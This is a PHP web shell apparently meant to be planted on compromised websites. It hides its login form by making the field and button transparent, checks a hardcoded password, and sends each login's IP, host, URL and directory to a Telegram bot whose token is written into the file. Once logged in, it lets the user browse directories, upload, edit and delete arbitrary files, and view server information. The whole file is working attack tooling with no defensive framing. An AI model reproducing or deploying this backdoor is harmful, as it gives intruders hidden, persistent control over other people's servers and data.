<?php
session_start();

$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

$telegram_token = '7351931358:AAGWbXI7hnIOvGKbnQPTt2z1DiOsVIU0vLs';
$chat_id = '7460763516';

function sendTelegramMessage($message) {
    global $telegram_token, $chat_id;
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    file_get_contents($url . '?' . http_build_query($data));
}

function logUserAccess() {
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    $host = $_SERVER['HTTP_HOST'];
    $script_name = $_SERVER['SCRIPT_NAME'];
    $url = "http://$host$script_name";
    $directory = realpath(__DIR__);

    $message = "User accessed the system:\n";
    $message .= "IP Address: $ip_address\n";
    $message .= "Timestamp: $timestamp\n";
    $message .= "Host: $host\n";
    $message .= "URL: $url\n";
    $message .= "Directory Location: $directory\n";

    sendTelegramMessage($message);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['password']) && $_POST['password'] === 'Cihuy66') {
        $_SESSION['loggedin'] = true; 
        logUserAccess(); 
        header("Location: " . $_SERVER['PHP_SELF']); // Redirect to the same page
        exit;
    } else {
        $error_message = "Password salah!";
    }
}

if (!isset($_SESSION['loggedin']) || !$_SESSION['loggedin']) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>KANCUT</title>
        <style>
            body {
                background: url('https://images.hdqwalls.com/wallpapers/ryomen-sukuna-5k-4g.jpg') no-repeat center center fixed;
                background-size: cover;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                margin: 0;
            }
            .login-container {
                background-color: rgba(255, 255, 255, 0); /* Fully transparent */
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 0px rgba(0, 0, 0, 0); /* No shadow */
                position: absolute; /* Absolute positioning */
                top: 1px; /* Distance from top */
                left: 1px; /* Distance from left */
            }
            .error-message {
                color: red;
            }
            input[type="password"] {
                width: 100%;
                padding: 1px;
                margin: 1px 0;
                border: none; /* No border */
                border-radius: 0px;
                background-color: rgba(255, 255, 255, 0); /* Fully transparent */
            }
            button {
                width: none;
                padding: none;
                border: none;
                border-radius: none;
                background-color: rgba(255, 255, 255, 0); /* Fully transparent */
                color: transparent;
            }
            button:hover {
                background-color: none;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2></h2>
            <?php if (isset($error_message)): ?>
                <p class="error-message"><?php echo $error_message; ?></p>
            <?php endif; ?>
            <form method="post">
                <input type="password" name="password" placeholder="" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit; 
}

$dir = isset($_GET['dir']) ? hex2bin($_GET['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file) {
    return is_writable($file);
}

if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = file_get_contents($file); // membaca isi file yang ingin diedit
    if ($content !== false) {
        echo '<form method="post" action="">'; // buat form baru untuk menampilkan textarea dan tombol Submit
        echo '<textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control">' . htmlspecialchars($content) . '</textarea>';
        echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '">';
        echo '<button type="submit" name="submit_edit" class="btn btn-outline-light">Submit</button>';
        echo '</form>';
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (file_put_contents($file, $content) !== false) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (unlink($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>H3LL0 B1TCH</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background: url('https://images.hdqwalls.com/wallpapers/ryomen-sukuna-5k-4g.jpg') no-repeat center center fixed;
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <h1>H3LL0 B1TCH</h1>
    </header>
    <main>
        <p>Current directory: <?php echo $current_dir; ?></p>
        <p>Server information: <?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
</tr>
<?php foreach ($files as $file): ?>
<tr>
    <td>
        <?php if (is_dir($dir . '/' . $file)): ?>
        <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>"
            style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
        <?php else: ?>
        <span style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></span>
        <?php endif; ?>
    </td>
    <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
        <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
    </td>
    <td>
        <?php if (is_file($dir . '/' . $file)): ?>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
            <button type="submit" class="btn btn-outline-light">Edit</button>
        </form>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
            <button type="submit" class="btn btn-outline-light">Delete</button>
        </form>
        <?php endif; ?>
    </td>
</tr>
<?php endforeach; ?>
</table>
</main>
</body>
</html>